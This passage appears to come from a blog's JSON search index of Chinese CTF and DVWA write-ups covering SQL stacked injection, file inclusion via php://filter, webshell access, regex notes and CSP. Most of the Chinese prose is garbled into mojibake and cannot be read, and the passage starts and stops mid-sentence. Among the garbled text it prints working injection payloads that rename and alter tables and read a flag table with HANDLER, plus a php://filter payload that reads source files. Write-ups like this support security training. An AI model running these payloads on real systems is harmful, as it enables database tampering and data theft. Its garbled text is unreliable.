·æŸ¥çœ‹è¿”å›é¡µé¢çš„æºç ï¼Œå¾—ï¼š å‚è€ƒï¼š å‘½ä»¤æ‰§è¡Œç»•è¿‡ï¼šhttps://www.dazhuanlan.com/2019/12/09/5dee4883dad99/ https://www.cnblogs.com/NPFS/p/13279815.html wpï¼šhttps://blog.csdn.net/vanarrow/article/details/108295481 https://blog.csdn.net/qq_46184013/article/details/107061110?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.control&amp;dist_request_id=1328767.72324.16177154446992417&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-1.control [æå®¢å¤§æŒ‘æˆ˜ 2019]Knifeç‚¹å¼€å®¹å™¨ï¼Œå‘ç°ç›´æ¥ç»™äº†æˆ‘ä»¬ä¸€å¥è¯æœ¨é©¬ æˆ‘ä»¬ç”¨èšå‰‘è¿æ¥ï¼Œå¯†ç Syc ç‚¹å‡»è™šæ‹Ÿç»ˆç«¯ï¼Œcat /flag [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ï¼šï¼ˆsqlå †å æ³¨å…¥+æ•°æ®åº“è¯­å¥çš„ä½¿ç”¨ï¼‰ç‚¹å¼€å®¹å™¨ æ˜¯ä¸€é“sqlæ³¨å…¥é¢˜ï¼Œå…ˆæ‹¿sqlmapè·‘ä¸€ä¸‹ï¼Œå‘ç°è·‘ä¸å‡ºæ¥ã€‚é‚£å°±æ‰‹å·¥æ³¨å…¥å§ çŒœæ³¨å…¥ç±»å‹ï¼š0&#39; or 1=1# æŸ¥è¯¢æœ‰ç»“æœ â€‹ 0&#39; or 1=2#æŸ¥è¯¢æ— ç»“æœ çŒœå­—æ®µï¼š1&#39; order by 2# æŸ¥è¯¢æœ‰ç»“æœ â€‹ 1&#39; order by 3# æŸ¥è¯¢æ— ç»“æœ æŸ¥çœ‹è¿”å›å€¼ï¼š1&#39; union select 1,2# å‘ç°å®ƒä½¿ç”¨æ­£åˆ™åŒ¹é…è¿‡æ»¤æ‰äº†å¾ˆå¤šè¯ï¼Œå°è¯•ä¸€ä¸‹å †å æ³¨å…¥ã€‚ çˆ†åº“ï¼špayloadï¼š1&#39;;show databases# çˆ†è¡¨ï¼špayloadï¼š1&#39;;show tables# è¿™é‡Œå…¶å®æœ‰ä¸ªç–‘æƒ‘ï¼Œå°±æ˜¯æˆ‘ä»¬æŸ¥è¡¨æ²¡æŒ‡æ˜åº“ï¼Œä¸åº”è¯¥è·³å‡ºæ‰€æœ‰çš„è¡¨å—ï¼Ÿä½†æ˜¯ä»–è·³å‡ºæ¥çš„æ˜¯supersqliåº“é‡Œçš„è¡¨ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ çˆ†åˆ—ï¼špayloadï¼š1â€™; show columns from `1919810931114514`# sp:å½“å­—ç¬¦ä¸²ä¸ºè¡¨åï¼Œå¼•ç”¨æ—¶è¦åŠ åå•å¼•å· 1919810931114514è¡¨ä¸­åªæœ‰flagä¸€åˆ—ï¼Œç”±æ­¤çœ‹æ¥ï¼Œ1919810931114514ä¸æ˜¯é»˜è®¤è¡¨ï¼Œè®¿é—®ä¸€ä¸‹wordsè¡¨â€”â€”1&#39;; show columns from words# wordsè¡¨ä¸­å«æœ‰dataå’Œidä¸¤ä¸ªåˆ—ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥çŒœæµ‹æ•°æ®åº“ä¸­çš„æŸ¥è¯¢è¯­å¥å¯èƒ½æ˜¯select id,data from words where id= è€Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯è·å–åˆ—flagçš„å€¼ æ³•1ï¼šç”±äºæˆ‘ä»¬çœ‹åˆ°æ•°æ®åº“é»˜è®¤çš„è¡¨æ˜¯wordsï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•æ”¹é€ `1919810931114514 `â€”â€”å°†wordsè¡¨åæ”¹ä¸ºwords1ï¼Œ1919810931114514æ”¹ä¸ºwordsï¼Œç„¶åå°†åˆ—åflagæ”¹ä¸ºidï¼Œæœ€ååœ¨æ„é€ 0&#39; or 1=1#å³å¯ payloadï¼š1&#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100);desc words# æˆ‘ä»¬çœ‹åˆ°åŸåˆ—åflagè¢«æ”¹ä¸ºäº†idï¼Œç„¶åpayload:0&#39; or 1=1# æ³•2ï¼š MySQLæ•°æ®åº“ä¸­è¿˜å¯ä»¥ä½¿ç”¨handleræŸ¥è¯¢å†…å®¹ï¼š HANDLER table_name OPENâ€”â€”æ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼ŒHANDLER table_name READ FIRSTâ€”â€”è·å–æ•°æ®è¡¨ç¬¬ä¸€è¡Œï¼Œé€šè¿‡å°† READ FIRSTæ”¹æˆREAD NEXTä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ‰ç‚¹ç±»ä¼¼äºæŒ‡é’ˆã€‚HANDLER table_name CLOSEâ€”â€”æ¥å…³é—­æ‰“å¼€çš„è¡¨ã€‚ ç´¢å¼•å»æŸ¥çœ‹çš„è¯è¦æŒ‰ä¸Šè¿°ä¸€å®šçš„é¡ºåºï¼Œè·å–è¡¨ä¸­çš„æ•°æ®ï¼š HANDLER table_name READ index_name FIRSTâ€”â€”è·å–å¥æŸ„ç¬¬ä¸€è¡Œï¼ˆç´¢å¼•æœ€å°çš„ä¸€è¡Œï¼‰ï¼ŒNEXTè·å–ä¸‹ä¸€è¡Œï¼ŒPREVè·å–å‰ä¸€è¡Œï¼ŒLASTè·å–æœ€åä¸€è¡Œï¼ˆç´¢å¼•æœ€å¤§çš„ä¸€è¡Œï¼‰ã€‚ ç´¢å¼•åˆ—æŒ‡å®šä¸€ä¸ªå€¼ï¼Œå¯ä»¥æŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ï¼š HANDLER table_name READ index_name = valueâ€”â€”æŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ï¼Œé€šè¿‡NEXTç»§ç»­æµè§ˆã€‚ å› æ­¤ï¼Œæˆ‘ä»¬æ„é€ payloadï¼š0â€™;handler `1919810931114514` open;handler `1919810931114514` read first# [SUCTF 2019]EasySQLï¼šï¼ˆsqlå †å æ³¨å…¥ï¼‰ä¸€é“postå‹sqlæ³¨å…¥é¢˜ï¼Œsqlmapè·‘ä¸€ä¸‹ï¼Œå‘ç°è·‘ä¸å‡ºæ¥ æ‰‹å·¥æ³¨å…¥ï¼š 1â€™ æ²¡æœ‰å›æ˜¾ï¼Œå¯èƒ½å±è”½äº†å›æ˜¾æŠ¥é”™ï¼Œé‚£ä¹ˆæŠ¥é”™æ³¨å…¥è‚¯å®šä¸å¯èƒ½äº† 1â€™ or 1=1# 1â€˜ and 1=1#ä¹Ÿä¸€æ ·ï¼Œåº”è¯¥æ˜¯andå’Œorè¢«è¿‡æ»¤äº† å°è¯•è”åˆæ³¨å…¥ï¼š1â€™ union select 1,2# æŸ¥è¯¢æ¡†ä¸­å•ç‹¬è¾“å…¥selectæ²¡æœ‰å›æ˜¾ï¼Œè¾“å…¥union çœ‹æ¥unionè¢«è¿‡æ»¤äº†ï¼Œå°è¯•ç›²æ³¨ï¼Œå…ˆè¾“ä¸€ä¸ªsleepï¼ŒåŒæ ·ä¸è®©ï¼Œé‚£ä¹ˆç›²æ³¨ä¹Ÿä¸è¡Œäº† è¯•è¯•å †å æ³¨å…¥ï¼š è¯•äº†åŠå¤©çš„1â€™;show databases#éƒ½æ²¡å›æ˜¾ï¼Œç„¶åpayloadæ”¹æˆ1;show databases# æ‰å‘ç°è¿™é¢˜æ˜¯æ•°å­—å‹æ³¨å…¥ 1;show tables;# 1;desc flag# åˆšå¼€å§‹æˆ‘è¿˜ä»¥ä¸ºä»–è¿‡æ»¤äº†descï¼Œç»“æœå•è¾“flagå‘ç°åŸæ¥æ˜¯è¿‡æ»¤äº†flag é‚£ä¹ˆåšåˆ°ç°åœ¨æˆ‘ä»¬å…ˆæ•´ç†ä¸€ä¸‹æ€è·¯â€”â€” 1.å½“æˆ‘ä»¬è¾“å…¥ä»»æ„æ•°å­—ï¼Œå›æ˜¾éƒ½æ˜¯1 è€Œå½“è¾“å…¥éæ•°å­—å†…å®¹æ—¶ï¼Œåˆ™æ— å›æ˜¾ 2.ç”±äºè¿‡æ»¤äº†ï¼Œé‚£ä¹ˆæŸ¥è¯¢è¯­å¥ä¸­è‚¯å®šæœ‰å›ºå®šçš„Flag åˆæ­¥çŒœæµ‹å¤§è‡´ä¸ºï¼š select $query xxx from Flag 3.å°è¯•ç”¨é€—å·éš”å¼€æŸ¥è¯¢åˆ—æ•° è¾“å…¥10,2 è¾“å…¥ 10,8,6 æˆ‘ä»¬å‘ç°æˆ‘ä»¬è¾“å…¥çš„æœ€åä¸€ä¸ªæ•°è¿”å›çš„æœ¬åº”è¯¥æ˜¯å…¶æœ¬èº«ï¼Œä½†æ˜¯è¿™é‡Œæ— è®ºè¾“å…¥ä»€ä¹ˆè¿”å›éƒ½æ˜¯1 äºæ˜¯æˆ‘ä»¬çŒœæµ‹ï¼šselect $query ||1 from Flag æˆ‘ä»¬çŸ¥é“select *from Flagæ˜¯è·å–Flagçš„æ‰€æœ‰å†…å®¹ é‚£ä¹ˆæ­¤å¤„æˆ‘ä»¬å¯ä»¥æ„é€ payloadï¼š$query=*,1 ï¼ˆä»£å…¥æŸ¥è¯¢è¯­å¥ä¸­å°±æ˜¯ï¼šselect *,1 ||1 from Flag ç­‰ä»·äºï¼šselect *from Flagï¼‰ æœ€ç»ˆå¾—ï¼š è¿™è¾¹æœ‰ä¸€ç‚¹æ³¨æ„ï¼š è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¸Šé¢ç¬¬3ç‚¹ä¸ºä»€ä¹ˆæˆ‘ä»¬è¾“å…¥çš„å‰å‡ ä½éƒ½æ˜¯è¿”å›å…¶æœ¬èº« å…¶å®è¿˜æœ‰ä¸€ç§ï¼Œä½†æ˜¯æˆ‘æ„Ÿè§‰æ›´éº»çƒ¦ï¼Œç•™ä¸€ä¸ªpayloadå§ï¼š1;set sql_mode=pipes_as_concat; select 1 å‚è€ƒåšå®¢ï¼šhttps://blog.csdn.net/ratear/article/details/109560061","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"æ­£åˆ™åŒ¹é…","date":"2021-04-04T08:04:04.000Z","path":"2021/04/04/æ­£åˆ™è¡¨è¾¾å¼/","text":"æ­£åˆ™è¡¨è¾¾å¼ï¼šæè¿°äº†ä¸€ç§å­—ç¬¦ä¸²åŒ¹é…çš„æ¨¡å¼ï¼ˆpatternï¼‰ï¼Œå¯ä»¥ç”¨æ¥æ£€æŸ¥ä¸€ä¸ªä¸²æ˜¯å¦å«æœ‰æŸç§å­ä¸²ã€å°†åŒ¹é…çš„å­ä¸²æ›¿æ¢æˆ–è€…ä»æŸä¸ªä¸²ä¸­å–å‡ºç¬¦åˆæŸä¸ªæ¡ä»¶çš„å­ä¸²ç­‰ã€‚ æ­£åˆ™è¡¨è¾¾å¼å¸¸ç”¨ä¿®é¥°ç¬¦ï¼š ä¿®é¥°ç¬¦ å«ä¹‰ æè¿° i ignore - ä¸åŒºåˆ†å¤§å°å†™ å°†åŒ¹é…è®¾ç½®ä¸ºä¸åŒºåˆ†å¤§å°å†™ï¼Œæœç´¢æ—¶ä¸åŒºåˆ†å¤§å°å†™: A å’Œ a æ²¡æœ‰åŒºåˆ«ã€‚ g global - å…¨å±€åŒ¹é… æŸ¥æ‰¾æ‰€æœ‰çš„åŒ¹é…é¡¹ã€‚ m multi line - å¤šè¡ŒåŒ¹é… ä½¿è¾¹ç•Œå­—ç¬¦ ^ å’Œ $ åŒ¹é…æ¯ä¸€è¡Œçš„å¼€å¤´å’Œç»“å°¾ï¼Œè®°ä½æ˜¯å¤šè¡Œï¼Œè€Œä¸æ˜¯æ•´ä¸ªå­—ç¬¦ä¸²çš„å¼€å¤´å’Œç»“å°¾ã€‚ s ç‰¹æ®Šå­—ç¬¦åœ†ç‚¹ . ä¸­åŒ…å«æ¢è¡Œç¬¦ \\n é»˜è®¤æƒ…å†µä¸‹çš„åœ†ç‚¹ . æ˜¯ åŒ¹é…é™¤æ¢è¡Œç¬¦ \\n ä¹‹å¤–çš„ä»»ä½•å­—ç¬¦ï¼ŒåŠ ä¸Š s ä¿®é¥°ç¬¦ä¹‹å, . ä¸­åŒ…å«æ¢è¡Œç¬¦ \\nã€‚ å¸¸è§çš„æ­£åˆ™åŒ¹é…å­—ç¬¦: å­—ç¬¦ æè¿° \\ å°†ä¸‹ä¸€ä¸ªå­—ç¬¦æ ‡è®°ä¸ºä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ã€æˆ–ä¸€ä¸ªåŸä¹‰å­—ç¬¦ã€æˆ–ä¸€ä¸ª å‘åå¼•ç”¨ã€æˆ–ä¸€ä¸ªå…«è¿›åˆ¶è½¬ä¹‰ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€™nâ€™ åŒ¹é…å­—ç¬¦ â€œnâ€ã€‚â€™\\nâ€™ åŒ¹é…ä¸€ä¸ªæ¢è¡Œç¬¦ã€‚åºåˆ— â€˜\\\\â€˜ åŒ¹é… â€œ\\â€œ è€Œ â€œ\\(â€œ åˆ™åŒ¹é… â€œ(â€œã€‚ ^ åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ã€‚å¦‚æœè®¾ç½®äº† RegExp å¯¹è±¡çš„ Multiline å±æ€§ï¼Œ^ ä¹ŸåŒ¹é… â€˜\\nâ€™ æˆ– â€˜\\râ€™ ä¹‹åçš„ä½ç½®ã€‚ $ åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®ã€‚å¦‚æœè®¾ç½®äº†RegExp å¯¹è±¡çš„ Multiline å±æ€§ï¼Œ$ ä¹ŸåŒ¹é… â€˜\\nâ€™ æˆ– â€˜\\râ€™ ä¹‹å‰çš„ä½ç½®ã€‚ \\d åŒ¹é…ä¸€ä¸ªæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº [0-9]ã€‚ \\d+ åŒ¹é…å¤šä¸ªæ•°å­—ã€‚ \\D åŒ¹é…ä¸€ä¸ªéæ•°å­—å­—ç¬¦ã€‚ç­‰ä»·äº [ ^0-9]ã€‚ x|y åŒ¹é… x æˆ– yã€‚ä¾‹å¦‚ï¼Œâ€™z|foodâ€™ èƒ½åŒ¹é… â€œzâ€ æˆ– â€œfoodâ€ã€‚â€™(z|f)oodâ€™ åˆ™åŒ¹é… â€œzoodâ€ æˆ– â€œfoodâ€ã€‚ [xyz] å­—ç¬¦é›†åˆã€‚åŒ¹é…æ‰€åŒ…å«çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ â€˜[abc]â€™ å¯ä»¥åŒ¹é… â€œplainâ€ ä¸­çš„ â€˜aâ€™ã€‚ [^xyz] è´Ÿå€¼å­—ç¬¦é›†åˆã€‚åŒ¹é…æœªåŒ…å«çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ â€˜[ ^abc]â€™ å¯ä»¥åŒ¹é… â€œplainâ€ ä¸­çš„â€™pâ€™ã€â€™lâ€™ã€â€™iâ€™ã€â€™nâ€™ã€‚ [a-z] å­—ç¬¦èŒƒå›´ã€‚åŒ¹é…æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€™[a-z]â€™ å¯ä»¥åŒ¹é… â€˜aâ€™ åˆ° â€˜zâ€™ èŒƒå›´å†…çš„ä»»æ„å°å†™å­—æ¯å­—ç¬¦ã€‚ [^a-z] è´Ÿå€¼å­—ç¬¦èŒƒå›´ã€‚åŒ¹é…ä»»ä½•ä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€™[ ^a-z]â€™ å¯ä»¥åŒ¹é…ä»»ä½•ä¸åœ¨ â€˜aâ€™ åˆ° â€˜zâ€™ èŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚ * åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œzo* èƒ½åŒ¹é… â€œzâ€ ä»¥åŠ â€œzooâ€ã€‚* ç­‰ä»·äº{0,}ã€‚ + åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™zo+â€™ èƒ½åŒ¹é… â€œzoâ€ ä»¥åŠ â€œzooâ€ï¼Œä½†ä¸èƒ½åŒ¹é… â€œzâ€ã€‚+ ç­‰ä»·äº {1,}ã€‚ {n} n æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚åŒ¹é…ç¡®å®šçš„ n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™o{2}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†æ˜¯èƒ½åŒ¹é… â€œfoodâ€ ä¸­çš„ä¸¤ä¸ª oã€‚ {n,} n æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚è‡³å°‘åŒ¹é…n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™o{2,}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†èƒ½åŒ¹é… â€œfooooodâ€ ä¸­çš„æ‰€æœ‰ oã€‚â€™o{1,}â€™ ç­‰ä»·äº â€˜o+â€™ã€‚â€™o{0,}â€™ åˆ™ç­‰ä»·äº â€˜o*â€™ã€‚ {n,m} m å’Œ n å‡ä¸ºéè´Ÿæ•´æ•°ï¼Œå…¶ä¸­n &lt;= mã€‚æœ€å°‘åŒ¹é… n æ¬¡ä¸”æœ€å¤šåŒ¹é… m æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€o{1,3}â€ å°†åŒ¹é… â€œfoooooodâ€ ä¸­çš„å‰ä¸‰ä¸ª oã€‚â€™o{0,1}â€™ ç­‰ä»·äº â€˜o?â€™ã€‚è¯·æ³¨æ„åœ¨é€—å·å’Œä¸¤ä¸ªæ•°ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ã€‚ . åŒ¹é…ä»»ä½•å­—ç¬¦ï¼Œæ¢è¡Œç¬¦ï¼ˆ\\nã€\\rï¼‰é™¤å¤–ã€‚ PHPçš„æ­£åˆ™è¡¨è¾¾å¼æœ‰ä¸€äº›å†…ç½®çš„é€šç”¨å­—ç¬¦ç°‡ï¼Œåˆ—è¡¨å¦‚ä¸‹ï¼š å­—ç¬¦ç°‡ æè¿° [[:alpha:]] ä»»ä½•å­—æ¯ [[:digit:]] ä»»ä½•æ•°å­— [[:alnum:]] ä»»ä½•å­—æ¯å’Œæ•°å­— [[:space:]] ä»»ä½•ç©ºç™½å­—ç¬¦ [[:upper:]] ä»»ä½•å¤§å†™å­—æ¯ [[:lower:]] ä»»ä½•å°å†™å­—æ¯ [[:punct:]] ä»»ä½•æ ‡ç‚¹ç¬¦å· [[:xdigit:]] ä»»ä½•16è¿›åˆ¶çš„æ•°å­—ï¼Œç›¸å½“äº[0-9a-fA-F] spï¼š phpçš„æ­£åˆ™è¡¨è¾¾å¼éœ€è¦æ”¾åœ¨// ä¹‹é—´ å‚è€ƒï¼šhttps://www.runoob.com/regexp/regexp-tutorial.html","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"JS","date":"2021-03-18T10:52:29.000Z","path":"2021/03/18/DVWAâ€”JS/","text":"å‰è¨€ï¼šjavascriptä¸€ç§å¸¸ç”¨äºé¡µé¢ä»£ç ä¸­ï¼Œç”¨æ¥å®ç°åŠ¨æ€æ•ˆæœçš„è„šæœ¬è¯­è¨€ã€‚ç”±äºJSæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼Œæ‰€ä»¥è¿‡åˆ†ä¾èµ–JSä»£ç é€»è¾‘ï¼Œå®¹æ˜“è¢«æ”»å‡»è€…è·å–ä»£ç åï¼Œè¿›è¡Œæ•°æ®ä¼ªé€ ã€‚ Lowï¼šå…ˆæäº¤é»˜è®¤æ•°æ® æäº¤success æ— æ•ˆçš„tokenæ€ä¹ˆå›äº‹å‘¢ï¼ŸæŸ¥çœ‹ç½‘é¡µæºç  æˆ‘ä»¬çœ‹åˆ°tokenç”±å‰ç«¯ç”Ÿæˆï¼Œä¸æœåŠ¡å™¨æ— å…³ï¼Œä½†æ˜¯å‰ç«¯çš„tokenæ˜¯æ ¹æ®ChangeMeæ¥ç”Ÿæˆçš„ï¼Œè€ŒæœåŠ¡å™¨è¦çš„tokenæ˜¯æ ¹æ®successç”Ÿæˆçš„ã€‚ åˆ©ç”¨æ§åˆ¶å°æ‰§è¡Œä»£ç  æˆ‘ä»¬å°†ç®­å·æ‰€æŒ‡çš„tokençš„å€¼ç”¨ä¸Šé¢å¼¹æ¡†ä¸­çš„å€¼æ›¿æ¢ Mediumï¼šhttp://www.bubuko.com/infodetail-2905900.html","tags":[{"name":"DVWAâ€”labs","slug":"DVWAâ€”labs","permalink":"http://example.com/tags/DVWA%E2%80%94labs/"}]},{"title":"CSP","date":"2021-03-18T10:40:08.000Z","path":"2021/03/18/DVWAâ€”CSP/","text":"Content-Security-PolicyæŒ‡çš„æ˜¯å†…å®¹å®‰å…¨æ£€æµ‹ï¼Œåˆç§°ç½‘é¡µå®‰å…¨æ”¿ç­–ï¼ŒCSPçš„å®è´¨å°±æ˜¯ç™½åå•åˆ¶åº¦ã€‚ Content-Security-Policyï¼ˆå†…å®¹å®‰å…¨ç­–ç•¥ï¼‰æ˜¯æŒ‡HTTPè¿”å›æŠ¥æ–‡å¤´ä¸­çš„æ ‡ç­¾ï¼Œæµè§ˆå™¨ä¼šæ ¹æ®æ ‡ç­¾ä¸­çš„å†…å®¹ï¼Œåˆ¤æ–­å“ªäº›èµ„æºå¯ä»¥åŠ è½½æˆ–æ‰§è¡Œã€‚æ˜¯ä¸ºäº†ç¼“è§£æ½œåœ¨çš„è·¨ç«™è„šæœ¬é—®é¢˜ï¼ˆXSSï¼‰ã€‚åŸæ¥åº”å¯¹XSSæ”»å‡»æ—¶ï¼Œä¸»è¦é‡‡ç”¨å‡½æ•°è¿‡æ»¤ã€è½¬ä¹‰è¾“å…¥ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€æ ‡ç­¾ã€æ–‡æœ¬æ¥è§„é¿æ”»å‡»ã€‚CSPçš„å®è´¨å°±æ˜¯ç™½åå•åˆ¶åº¦ï¼Œå¼€å‘äººå‘˜æ˜ç¡®å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œå“ªäº›å¤–éƒ¨èµ„æºå¯ä»¥åŠ è½½å’Œæ‰§è¡Œã€‚å¼€å‘è€…åªéœ€è¦æä¾›é…ç½®ï¼Œå®ç°å’Œæ‰§è¡Œå…¨éƒ¨ç”±æµè§ˆå™¨å®Œæˆã€‚ç®€è€Œè¨€ä¹‹å°±æ˜¯åœ¨å‰ç«¯æ·»åŠ ä¸€äº›æ ‡ç­¾ï¼Œå‘Šè¯‰æµè§ˆå™¨å“ªäº›èµ„æºå¯ä»¥åŠ è½½è®¿é—®ã€‚","tags":[{"name":"dvwaâ€”labs","slug":"dvwaâ€”labs","permalink":"http://example.com/tags/dvwa%E2%80%94labs/"}]},{"title":"bugku(1)","date":"2021-03-16T14:56:40.000Z","path":"2021/03/16/bugku1/","text":"web11ï¼šï¼ˆå¾¡å‰‘æ‰«æåç«¯ï¼‰ è¿™é¢˜çš„é¢˜ç›®æ˜¯ï¼šç½‘ç«™è¢«é»‘äº† é»‘å®¢ä¼šä¸ä¼šç•™ä¸‹åé—¨ é‚£ä¹ˆæˆ‘ä»¬è¦å€ŸåŠ©å¾¡å‰‘è¿™ä¸ªåé—¨æ‰«æå·¥å…·ï¼Œæ‰«æç›®æ ‡ç½‘ç«™ï¼Œå‘ç°æœ‰ä¸ªshell.phpæ–‡ä»¶ è®¿é—®shell.php ç”¨bpæŠ“åŒ…çˆ†ç ´å¯çŸ¥å¯†ç ä¸ºhack passä¸ºhackï¼Œç™»å…¥ web13ï¼šï¼ˆurlè§£ç ï¼‰é¢˜ç›®å«æˆ‘ä»¬çœ‹çœ‹æºç ï¼Œæˆ‘ä»¬çœ‹çœ‹æºç ï¼š æˆ‘ä»¬å¯¹å…¶urlè§£ç ï¼š 12345678910function checkSubmit()&#123;var a=document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!=typeof a)&#123; if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value) return!0; alert(&quot;Error&quot;); a.focus(); return!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit; æäº¤å­—ç¬¦ä¸²67d709b2b54aa2aa648cf6e87a7114f1 web14ï¼šï¼ˆæ–‡ä»¶åŒ…å«åŠ php://filterï¼‰è¿›å…¥é¢˜ç›®ï¼Œçœ‹åˆ° ç‚¹å‡»click meï¼Ÿ noè·³è½¬ å‘ç°æ˜¯æ–‡ä»¶åŒ…å«é¢˜ã€‚ è¡¥å…… include()å‡½æ•°å¯¹æ–‡ä»¶åç¼€åæ— è¦æ±‚ï¼Œè€Œå¯¹å…¶ä¸­çš„è¯­æ³•æœ‰è¦æ±‚ï¼Œå³ä½¿åç¼€åä¸ºtxtï¼Œjpgä¹Ÿä¼šè¢«å½“åšphpæ–‡ä»¶è§£æï¼Œåªè¦æ–‡ä»¶å†…æ˜¯å½¢å¼å°±å¯ä»¥æ‰§è¡Œï¼Œä½†æ˜¯å¦‚æœä¸æ˜¯phpè¯­æ³•çš„å½¢å¼ï¼Œå³ä½¿åç¼€ä¸ºphpï¼Œä¹Ÿæ— æ³•æ‰§è¡Œã€‚ php://filter è®¾è®¡ç”¨æ¥è¿‡æ»¤ç­›é€‰æ–‡ä»¶ã€‚å¦‚æœæƒ³è¦è¯»å–è¿è¡Œphpæ–‡ä»¶çš„æºç ï¼Œéœ€è¦å…ˆå¯¹è¯¥phpæ–‡ä»¶å†…å®¹base64ç¼–ç ï¼Œå†ä¼ å…¥includeå‡½æ•°ï¼Œè¿™æ ·å°±ä¸ä¼šè¢«è®¤ä¸ºæ˜¯phpä»£ç ï¼Œä¸ä¼šæ‰§è¡Œï¼Œä¼šè¾“å‡ºæ–‡ä»¶çš„base64ç¼–ç ï¼Œåç»­å†è§£ç å³å¯è·å¾—æºç ã€‚ æ•…æœ¬é¢˜payloadä¸ºï¼šphp://filter/read=convert.base64-encode/resource=index.php base64è§£ç ï¼š å‚è€ƒåšå®¢: https://blog.csdn.net/zpy1998zpy/article/details/80598768 https://www.freebuf.com/column/148886.html web16ï¼šï¼ˆMD5()å‡½æ•°ç»•è¿‡ï¼‰è¿›å…¥ç¯å¢ƒåå‘ç°å°±ä¸€ä¸²æ•°å­—ï¼Œå…¶ä»–ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œæ£€æŸ¥ç½‘é¡µæºç ï¼ŒæŠ“åŒ…çœ‹å›æ˜¾éƒ½æ²¡æœ‰ä»€ä¹ˆçº¿ç´¢ï¼Œåˆç”¨å¾¡å‰‘æ‰«æç½‘é¡µåå° å‘ç°ä¸€ä¸ª.bakæ‹“å±•åï¼ˆbakè¿™ç§å¤‡ä»½æ–‡ä»¶åœ¨æˆ‘ä»¬å¹³å¸¸ä½¿ç”¨ç»˜å›¾ã€ç¼–ç¨‹è½¯ä»¶æ—¶éƒ½ä¼šé»˜è®¤åˆ›å»ºå¤‡ä»½æ–‡ä»¶ï¼Œå¦‚cadæ–‡ä»¶ä¿®æ”¹åä¼šäº§ç”Ÿbakæ–‡ä»¶ï¼Œwpsã€wordç­‰æ–‡ä»¶ä¿®æ”¹åä¹Ÿéƒ½ä¼šäº§ç”Ÿbakå¤‡ä»½æ–‡ä»¶ï¼Œè¿™æ ·å¯ä»¥ä¿è¯å½“æºæ–‡ä»¶ä¸å°å¿ƒè¢«åˆ æ‰æˆ–è€…å‡ºç°æ•…éšœå¯¼è‡´æ— æ•…è‡ªåŠ¨é€€å‡ºæ—¶ï¼Œè¿˜å¯ä»¥ä»bakå¤‡ä»½æ–‡ä»¶ç»§ç»­ç¼–è¾‘ï¼Œå‡å°‘äº†ä¸å°‘è¯¯æ“ä½œå¸¦æ¥çš„æŸå¤±ã€‚ï¼‰çš„æ–‡ä»¶ï¼Œç»“åˆæè¿°çš„ä¿¡æ¯ï¼šå¤‡ä»½æ˜¯ä¸ªå¥½ä¹ 